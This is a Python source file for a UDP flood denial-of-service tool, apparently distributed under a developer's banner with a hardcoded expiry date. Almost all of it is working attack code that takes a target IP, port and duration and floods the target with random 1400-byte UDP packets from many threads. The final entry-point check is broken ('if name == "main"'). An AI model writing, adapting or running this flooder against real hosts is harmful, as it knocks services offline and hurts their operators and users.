import sys
import socket
import random
import time
import signal
import threading
import multiprocessing
from datetime import datetime, timedelta

PACKET_SIZE = 1400
CHUNK_DURATION = 280
EXPIRY_DATE = "2024-07-30T23:00:00"

def main():
    print()
    print("*********")
    print("CODED BY ABHIRAJ")
    print("*********")

    check_expiry()

    if len(sys.argv) != 4:
        print("Usage: python script.py <target_ip> <target_port> <attack_duration>")
        print()
        return

    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    try:
        duration = int(sys.argv[3])
        if duration <= 0:
            raise ValueError
    except ValueError:
        print("Invalid attack duration")
        return
    duration_time = timedelta(seconds=duration)

    num_threads = max(1, int(multiprocessing.cpu_count() * 2.5))
    packets_per_second = 1_000_000_000 // PACKET_SIZE

    done = threading.Event()
    signal.signal(signal.SIGINT, lambda s, f: done.set())
    signal.signal(signal.SIGTERM, lambda s, f: done.set())

    threading.Thread(target=countdown, args=(duration_time, done), daemon=True).start()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack_thread, args=(target_ip, target_port, packets_per_second // num_threads, duration_time, done))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def check_expiry():
    current_date = datetime.now()
    expiry = datetime.strptime(EXPIRY_DATE, "%Y-%m-%dT%H:%M:%S")

    if current_date > expiry:
        print("This script has expired. Please contact the developer for a new version.")
        sys.exit(1)

def create_connection(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((ip, int(port)))
    return sock

def attack_thread(target_ip, target_port, packets_per_second, duration, done):
    try:
        sock = create_connection(target_ip, target_port)
    except socket.error as e:
        print(f"Error creating UDP connection: {e}")
        return

    try:
        send_udp_packets(sock, packets_per_second, duration, done)
    finally:
        sock.close()

def send_udp_packets(sock, packets_per_second, duration, done):
    packet = generate_packet(PACKET_SIZE)
    interval = 1 / packets_per_second
    deadline = time.time() + duration.total_seconds()

    while time.time() < deadline and not done.is_set():
        try:
            sock.send(packet)
        except socket.error as e:
            print(f"Error sending UDP packet: {e}")
            return
        time.sleep(interval)

def countdown(duration, done):
    remaining_time = duration
    while remaining_time > timedelta() and not done.is_set():
        print(f"\rTime remaining: {remaining_time}", end="")
        time.sleep(1)
        remaining_time -= timedelta(seconds=1)
    print("\rTime remaining: 0:00:00")

def generate_packet(size):
    return bytes(random.randint(0, 255) for _ in range(size))

if name == "main":
    main()
